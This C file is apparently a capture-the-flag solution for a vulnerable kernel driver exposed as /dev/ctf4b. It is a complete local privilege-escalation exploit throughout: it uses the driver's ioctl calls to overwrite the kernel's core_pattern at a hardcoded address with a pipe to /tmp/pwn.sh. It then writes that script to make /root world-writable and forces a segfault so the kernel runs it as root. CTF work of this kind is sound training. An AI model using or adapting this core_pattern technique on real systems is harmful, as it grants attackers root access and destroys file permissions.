#include "ctf4b.h"
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <unistd.h>

#define addr_core_pattern 0xffffffff81eb4320

void fatal(const char *msg) {
  perror(msg);
  exit(1);
}

int main() {
  int fd;
  fd = open("/dev/ctf4b", O_RDWR);
  if (fd == -1) fatal("/dev/ctf4b");

  // g_message <-- "|/tmp/pwn.sh"
  puts("[+] Prepareing payload");
  char *buf = (char*)malloc(CTF4B_MSG_SIZE);
  strcpy(buf, "|/tmp/pwn.sh");
  ioctl(fd, CTF4B_IOCTL_STORE, buf);

  // core_pattern <-- g_message
  puts("[+] Overwriting core_pattern");
  ioctl(fd, CTF4B_IOCTL_LOAD, addr_core_pattern);

  free(buf);
  close(fd);

  // prepare scripts
  puts("[+] Creating scripts...");
  system("echo '#!/bin/sh' > /tmp/pwn.sh");
  system("echo '/bin/chmod 777 -R /root' >> /tmp/pwn.sh");
  system("chmod 777 /tmp/pwn.sh");

  // win!
  puts("[+] Going to segfault. Check '/root' directory.");
  *(int*)NULL = 0;
  return 0;
}
